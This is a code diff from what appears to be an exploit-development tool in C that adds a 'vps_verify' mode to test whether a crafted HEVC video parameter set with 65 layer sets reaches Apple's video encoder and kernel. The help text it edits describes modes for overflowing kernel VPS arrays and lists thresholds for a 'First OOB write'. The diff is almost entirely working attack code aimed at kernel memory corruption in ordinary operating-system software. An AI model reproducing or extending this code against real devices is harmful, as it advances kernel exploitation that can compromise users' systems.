@@ -4587,6 +4587,217 @@ cleanup_dummies:
 
         rlog("Found %d AVE/video-related services\n", found_count);
 
+    } else if (strcmp(mode, "vps_verify") == 0) {
+        /*
+         * vps_verify — Verify whether crafted VPS reaches the kernel
+         * by examining the output format description from the encode callback.
+         * Also tries creating encoder with crafted format as source attributes.
+         */
+        rlog("=== VPS Kernel Delivery Verification ===\n\n");
+
+        /* Step 1: Normal encode — capture baseline VPS from output */
+        rlog("--- Step 1: Baseline encode (no crafted VPS) ---\n");
+        {
+            VTCompressionSessionRef session = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                encode_cb, NULL, &session);
+            if (st != 0) { rlog("FAIL create: %d\n", (int)st); goto done; }
+
+            st = VTCompressionSessionPrepareToEncodeFrames(session);
+            g_encode_done = 0;
+            encode_one(session, 0, 128, 128);
+            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+            st = VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+
+            if (g_saved_fmt) {
+                rlog("Baseline output parameter sets:\n");
+                dump_psets(g_saved_fmt, 0);
+
+                /* Extract VPS from baseline */
+                const uint8_t *vps_ptr = NULL;
+                size_t vps_sz = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    g_saved_fmt, 0, &vps_ptr, &vps_sz, NULL, NULL);
+                rlog("Baseline VPS: %zu bytes\n", vps_sz);
+                if (vps_ptr && vps_sz > 4) {
+                    rlog("  First 32 bytes: ");
+                    for (size_t j = 0; j < 32 && j < vps_sz; j++)
+                        rlog("%02x", vps_ptr[j]);
+                    rlog("\n");
+                }
+                CFRelease(g_saved_fmt);
+                g_saved_fmt = NULL;
+            }
+
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+
+        /* Step 2: Encode with crafted VPS attached — compare output */
+        rlog("\n--- Step 2: Encode with crafted VPS attachment ---\n");
+        {
+            VTCompressionSessionRef session = NULL;
+            OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                kCMVideoCodecType_HEVC, NULL, NULL, NULL,
+                encode_cb, NULL, &session);
+            if (st != 0) { rlog("FAIL create: %d\n", (int)st); goto done; }
+
+            st = VTCompressionSessionPrepareToEncodeFrames(session);
+
+            /* Build crafted VPS with 65 layer sets */
+            uint8_t vps_nal[8192];
+            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
+
+            uint8_t sps_nal[256];
+            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
+
+            uint8_t pps_nal[128];
+            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
+
+            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
+            size_t psizes[] = { vps_len, sps_len, pps_len };
+
+            CMFormatDescriptionRef crafted_fmt = NULL;
+            st = CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
+            rlog("Crafted format (65 layer sets): %d\n", (int)st);
+
+            /* Create pixel buffer with attachment */
+            CVPixelBufferRef pb = NULL;
+            CFMutableDictionaryRef pba = CFDictionaryCreateMutable(NULL, 1,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionaryRef empty = CFDictionaryCreate(NULL, NULL, NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(pba, kCVPixelBufferIOSurfacePropertiesKey, empty);
+            CFRelease(empty);
+            CVPixelBufferCreate(NULL, 128, 128,
+                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, pba, &pb);
+            CFRelease(pba);
+
+            if (pb && crafted_fmt) {
+                CVBufferSetAttachment(pb, CFSTR("FormatDescription"),
+                    crafted_fmt, kCVAttachmentMode_ShouldPropagate);
+
+                /* Also attach raw VPS data */
+                CFDataRef vps_data = CFDataCreate(NULL, vps_nal, (CFIndex)vps_len);
+                CVBufferSetAttachment(pb, CFSTR("HEVCVideoParameterSet"),
+                    vps_data, kCVAttachmentMode_ShouldPropagate);
+                CFRelease(vps_data);
+
+                g_encode_done = 0;
+                g_cb_count = 0;
+
+                CMTime pts = CMTimeMake(0, 30);
+                const void *fp_keys[] = { kVTEncodeFrameOptionKey_ForceKeyFrame };
+                const void *fp_vals[] = { kCFBooleanTrue };
+                CFDictionaryRef fp = CFDictionaryCreate(NULL, fp_keys, fp_vals, 1,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+                st = VTCompressionSessionEncodeFrame(session, pb,
+                    pts, kCMTimeInvalid, fp, NULL, NULL);
+                rlog("EncodeFrame: %d\n", (int)st);
+                CFRelease(fp);
+
+                for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+
+                rlog("Callback count: %d, status: %d\n", g_cb_count, (int)g_cb_status);
+
+                if (g_saved_fmt) {
+                    rlog("Output parameter sets (with crafted attachment):\n");
+                    dump_psets(g_saved_fmt, 0);
+
+                    const uint8_t *out_vps = NULL;
+                    size_t out_vps_sz = 0;
+                    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                        g_saved_fmt, 0, &out_vps, &out_vps_sz, NULL, NULL);
+                    rlog("Output VPS: %zu bytes (crafted was %zu)\n",
+                        out_vps_sz, vps_len);
+
+                    if (out_vps && out_vps_sz > 4) {
+                        rlog("  First 32 bytes: ");
+                        for (size_t j = 0; j < 32 && j < out_vps_sz; j++)
+                            rlog("%02x", out_vps[j]);
+                        rlog("\n");
+
+                        if (out_vps_sz == vps_len) {
+                            int match = (memcmp(out_vps, vps_nal, vps_len) == 0);
+                            rlog("VPS SIZE MATCH! Content %s\n",
+                                match ? "IDENTICAL — crafted VPS reached encoder!" :
+                                "differs — encoder generated its own");
+                        } else {
+                            rlog("VPS sizes differ: output=%zu crafted=%zu\n",
+                                out_vps_sz, vps_len);
+                            rlog("Encoder generated its own VPS (attachment ignored)\n");
+                        }
+                    }
+                    CFRelease(g_saved_fmt);
+                    g_saved_fmt = NULL;
+                }
+                CVPixelBufferRelease(pb);
+            }
+            if (crafted_fmt) CFRelease(crafted_fmt);
+            VTCompressionSessionInvalidate(session);
+            CFRelease(session);
+        }
+
+        /* Step 3: Try creating encoder with crafted sourceImageBufferAttributes */
+        rlog("\n--- Step 3: Encoder with crafted source format ---\n");
+        {
+            uint8_t vps_nal[8192];
+            size_t vps_len = build_crafted_vps(vps_nal, sizeof(vps_nal), 65);
+            uint8_t sps_nal[256];
+            size_t sps_len = build_minimal_sps(sps_nal, sizeof(sps_nal));
+            uint8_t pps_nal[128];
+            size_t pps_len = build_minimal_pps(pps_nal, sizeof(pps_nal));
+
+            const uint8_t *psets[] = { vps_nal, sps_nal, pps_nal };
+            size_t psizes[] = { vps_len, sps_len, pps_len };
+
+            CMFormatDescriptionRef crafted_fmt = NULL;
+            CMVideoFormatDescriptionCreateFromHEVCParameterSets(
+                NULL, 3, psets, psizes, 4, NULL, &crafted_fmt);
+
+            if (crafted_fmt) {
+                /* Use crafted format's extensions as source attrs */
+                CFDictionaryRef exts = CMFormatDescriptionGetExtensions(crafted_fmt);
+                rlog("Crafted format extensions: %s\n", exts ? "present" : "NULL");
+
+                if (exts) {
+                    CFMutableDictionaryRef src_attrs = CFDictionaryCreateMutableCopy(
+                        NULL, 0, exts);
+
+                    VTCompressionSessionRef session = NULL;
+                    OSStatus st = VTCompressionSessionCreate(NULL, 128, 128,
+                        kCMVideoCodecType_HEVC, NULL, src_attrs, NULL,
+                        encode_cb, NULL, &session);
+                    rlog("Create with crafted sourceAttrs: %d\n", (int)st);
+
+                    if (st == 0 && session) {
+                        st = VTCompressionSessionPrepareToEncodeFrames(session);
+                        rlog("Prepare: %d\n", (int)st);
+
+                        g_encode_done = 0;
+                        encode_one(session, 0, 128, 128);
+                        for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                        VTCompressionSessionCompleteFrames(session, kCMTimeInvalid);
+
+                        if (g_saved_fmt) {
+                            rlog("Output with crafted source attrs:\n");
+                            dump_psets(g_saved_fmt, 0);
+                            CFRelease(g_saved_fmt);
+                            g_saved_fmt = NULL;
+                        }
+                        VTCompressionSessionInvalidate(session);
+                        CFRelease(session);
+                    }
+                    CFRelease(src_attrs);
+                }
+                CFRelease(crafted_fmt);
+            }
+        }
+
     } else if (strcmp(mode, "xpc_vps") == 0) {
         /*
          * xpc_vps — Attempt to reach mediaserverd's compression XPC service
@@ -4953,7 +5164,8 @@ cleanup_dummies:
         rlog("  vps_overflow       -- KEY: Set >64 MV-HEVC layers to overflow kernel VPS arrays\n");
         rlog("  iokit_vps [phase]  -- Direct IOKit probe: enumerate AVE service + craft VPS\n");
         rlog("  iokit_enum         -- Enumerate all IOKit video encoder services\n");
-        rlog("  xpc_vps [phase]    -- KEY: XPC VPS field manipulation + crafted format injection\n");
+        rlog("  vps_verify         -- KEY: Verify if crafted VPS reaches kernel (compare output)\n");
+        rlog("  xpc_vps [phase]    -- XPC VPS field manipulation + crafted format injection\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
